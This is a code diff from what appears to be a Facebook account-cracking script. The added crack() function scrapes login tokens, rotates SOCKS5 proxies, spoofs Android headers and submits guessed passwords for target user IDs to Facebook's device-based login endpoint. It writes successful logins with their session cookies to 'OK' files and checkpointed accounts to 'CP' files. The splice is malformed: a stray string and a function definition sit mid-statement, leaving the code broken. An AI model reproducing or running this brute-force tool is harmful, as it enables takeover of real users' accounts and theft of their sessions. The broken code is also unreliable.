@@ -456,22 +456,41 @@ def passwrd():
 					pwv.append(xpwd)
 			else:pass
 			if 'mobile' in method:
-				pool.submit(crackmobile_SHOAIB,idf,pwv,nmf)
-			elif 'mbasic' in method:
-				pool.submit(crackmbasic_SHOAIB,idf,pwv,nmf)
+			'ya'def crack(idf,pwv):
+	global loop,ok,cp
+	sys.stdout.write(f"\r{x}[M2] | {P}{loop}{P} | {H}LIVE-{ok} {P}| {K}CHECK-{cp}")
+	sys.stdout.flush()
+	ua = ua_valid()
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
+			link= ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%2F%3Fclient_id%3D276833659620656%26redirect_uri%3Dhttps%253A%252F%252Flogin.wolves.co.uk%252FAuth%252FFacebookSignin%26response_type%3Dcode%26state%3D1%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fcfb611-9dcd-46a5-b040-18167ca9f72a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.wolves.co.uk%2FAuth%2FFacebookSignin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"next=https://m.facebook.com/v13.0/dialog/oauth/?client_id=276833659620656&redirect_uri=https%3A%2F%2Flogin.wolves.co.uk%2FAuth%2FFacebookSignin&response_type=code&state=1&scope=email&ret=login&fbapp_pres=0&logger_id=8fcfb611-9dcd-46a5-b040-18167ca9f72a&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			cokz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
+			cokz+=' m_pixel_ratio=2.625; wd=412x756'
+			head={'Host': 'x.prod.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://x.prod.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%2F%3Fclient_id%3D276833659620656%26redirect_uri%3Dhttps%253A%252F%252Flogin.wolves.co.uk%252FAuth%252FFacebookSignin%26response_type%3Dcode%26state%3D1%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fcfb611-9dcd-46a5-b040-18167ca9f72a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Flogin.wolves.co.uk%2FAuth%2FFacebookSignin%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D1%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
+			po = ses.post('https://x.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,cookies={'cookie': cokz},headers=head,allow_redirects=False,proxies=proxs)
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				print(f'\r{P}[{K}CP{P}] : {K}{idf}|{pw}')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				akun.append(idf+'|'+pw)
+				cp+=1
+				break
+			elif "c_user" in ses.cookies.get_dict().keys():
+				ok+=1
+				coki=po.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'\r{P}[{H}OK{P}] : {H}{idf}|{pw}')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				break
+
 			else:
-				pool.submit(crackmbasic,idf,pwv,nmf)
-	print(f'{N}╭───[{b}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{N}{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
-	print('│')
-	print(f'[{b}•{x}] Crack Again ( Y/t ) ? ')
-	woi = input(f'╰───[{b}•{x}] Pilih : ')
-	if woi in ['y','Y']:
-		back()
-	else:
-		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
-		time.sleep(2)
-		exit()
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(1)
+	loop+=1
 #--------------------[ METODE-B-API ]-----------------#
 def crackmobile_SHOAIB(idf,pwv,nmf):
 	global loop,ok,cp
